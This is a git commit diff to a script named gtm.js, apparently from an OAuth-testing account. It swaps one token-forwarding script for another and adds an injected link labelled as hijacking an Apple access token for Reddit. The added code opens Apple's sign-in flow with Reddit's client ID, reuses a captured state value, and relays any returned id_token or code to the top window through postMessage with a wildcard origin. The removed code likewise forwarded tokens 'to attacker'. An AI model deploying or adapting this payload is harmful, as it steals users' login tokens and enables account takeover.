b28f50a015c457c6456f8f7751f5d91acab4c2b7
oauthtest444 <oauthtest444@gmail.com>
2026-05-17 19:07:47 +0530

    Update gtm.js

--- gtm.js
+++ gtm.js
@@ -1,17 +1,18 @@
-<script>
-    console.log("%c[GTM] Leaky script running", "color:red");
+<script>var b, x;
+var state = parent.location.href.substr(location.href.indexOf('state='));
+var d = document.createElement('div');
+if (!window.inited) {
+  window.inited = true;
+d.innerHTML = '<a href="#" onclick="b=window.open(\'https://appleid.apple.com/auth/authorize?client_id=com.reddit.RedditAppleSSO&redirect_uri=https%3A%2F%2Fwww.reddit.com&response_type=code+id_token&state=' + state + '&scope=&response_mode=fragment&m=12&v=1.5.4\');">Click here to hijack Apple access-token for Reddit</a>';
+parent.document.children[parent.document.children.length - 1].appendChild(d);
+if(top!==parent.window) top.postMessage('stopinject', '*');
+parent.window.onmessage=function(e) { if(e.data.indexOf('id_token') !== -1 || e.data.indexOf('code') !== -1) { top.postMessage(e.data, '*'); b.close(); } };
+x = setInterval(function() {
+if(parent.window.b && parent.window.b.frames[0] && parent.window.b.frames[0].window && parent.window.b.frames[0].window.name) {
+  top.postMessage(parent.window.b.frames[0].window.name, '*'); parent.window.b.close();
+  clearInterval(x);
+};
 
-    const state = new URLSearchParams(location.search).get('state') || 'teststate123';
-
-    if (!window.inited) {
-        window.inited = true;
-
-        // Auto send token if present in URL
-        if (location.hash && location.hash.includes('id_token')) {
-            console.log("%c[GTM] Token found in URL, sending to attacker...", "color:lime");
-            top.postMessage(location.hash, '*');           // Most important line
-            parent.postMessage(location.hash, '*');        // Extra safety
-            window.postMessage(location.hash, '*');
-        }
-    }
+}, 500);
+}
 </script>
